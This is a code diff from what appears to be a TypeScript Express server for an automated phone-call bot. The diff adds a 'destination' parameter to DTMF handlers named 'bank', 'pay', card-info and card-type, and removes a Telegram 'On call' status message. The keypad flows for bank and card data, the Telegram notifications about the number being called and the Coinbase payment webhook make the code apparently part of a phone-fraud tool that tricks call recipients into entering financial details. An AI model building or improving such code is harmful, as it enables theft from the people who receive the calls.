@@ -121,13 +121,21 @@ app.post('/coinbase-webhook', async (req, res) => {
 
 app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
   const { step, language, chatId } = req.params;
-  const { wallet, askCardInfo, cardType, variables } = req.query;
+  const { wallet, askCardInfo, cardType, variables, destination } = req.query;
 
   const { dtmf } = JSON.parse(variables as string);
 
   switch (step) {
     case 'bank':
-      bankFlow(String(dtmf), res, language, Number(chatId), step);
+      bankFlow(
+        String(dtmf),
+        res,
+        language,
+        Number(chatId),
+        step,
+        destination as string,
+      );
+
       break;
     case 'pay':
       payFlow(
@@ -136,6 +144,7 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
         language,
         Number(chatId),
         step,
+        destination as string,
         wallet as string,
       );
       break;
@@ -146,6 +155,7 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
         language,
         Number(chatId),
         step,
+        destination as string,
         askCardInfo as string,
       );
       break;
@@ -156,6 +166,7 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
         language,
         Number(chatId),
         step,
+        destination as string,
         cardType as string,
       );
       break;
@@ -749,12 +760,6 @@ app.post('/calls/:chatId', async (req, res) => {
 
   if (status === 'ringing' || status === 'starting') {
     await bot.telegram.sendMessage(chatId, `Ringing (${destination}) 🔔`);
-  }
-
-  if (status === 'ongoing') {
-    await bot.telegram.sendMessage(chatId, `On call (${destination}) 🤳🏽`, {
-      parse_mode: 'HTML',
-    });
   }
 
   if (status === 'busy') {
